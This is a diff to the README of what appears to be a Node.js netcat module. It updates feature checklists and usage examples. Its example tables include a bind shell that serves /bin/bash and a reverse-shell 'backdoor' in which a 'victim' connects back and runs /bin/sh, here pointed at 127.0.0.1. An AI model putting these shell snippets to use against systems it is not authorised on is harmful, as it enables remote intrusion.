@@ -16,7 +16,7 @@ This module implements all the basic netcat's features. To use as standalone too
 
 ## What you can do :computer:
 
-- [ ] TCP & UDP
+- [x] TCP & UDP
 - [x] Backdoor (Reverse Shell)
 - [x] Honeypot
 - [x] File transfer
@@ -86,7 +86,7 @@ The server will be kept alive and not being closed after the first connection. (
 
 | Server              | Client                             |
 |---------------------|------------------------------------|
-|`nc.port(2389).listen().exec('/bin/bash')`|`process.stdin.pipe(nc2.port(2389).connect().pipe(process.stdout).stream())`|
+|`nc.port(2389).listen().exec('/bin/bash')`|`process.stdin .pipe(nc2.addr('127.0.0.1').port(2389).connect().pipe(process.stdout).stream())`|
 
 The `exec()` method execute the given command and pipe together his `stdout` and `stderr` with the clients `socket`.
 
@@ -94,7 +94,7 @@ The `exec()` method execute the given command and pipe together his `stdout` and
 
 | Attacker              | Victim                           |
 |---------------------|------------------------------------|
-|`nc.port(2389).listen().serve(process.stdin).pipe(process.stdout)`|`nc2.port(2389).retry(5000).connect().exec('/bin/sh')`|
+|`nc.port(2389).listen().serve(process.stdin).pipe(process.stdout)`|`nc2.addr('127.0.0.1').port(2389) .retry(5000).connect().exec('/bin/sh')`|
 
 #### Netcat as a proxy
 
@@ -234,7 +234,7 @@ Available options:
 - [x] `-k set               keepalive option on socket`
 - [x] `-l                   listen mode, for inbound connects`
 - [ ] `-n                   numeric-only IP addresses, no DNS`
-- [ ] `-o file              hex dump of traffic (CLI)`
+- [ ] `-o file              hex dump of traffic`
 - [x] `-p port              local port number`
 - [ ] `-r                   randomize local and remote ports`
 - [ ] `-q secs              quit after EOF on stdin and delay of secs`
@@ -265,7 +265,7 @@ Coverage:
 - [x] `exec()` method
 - [x] Backdoor shell
 - [x] Proxy server
-- [ ] UDP.
+- [x] UDP.
 
 ## Known limitations
 
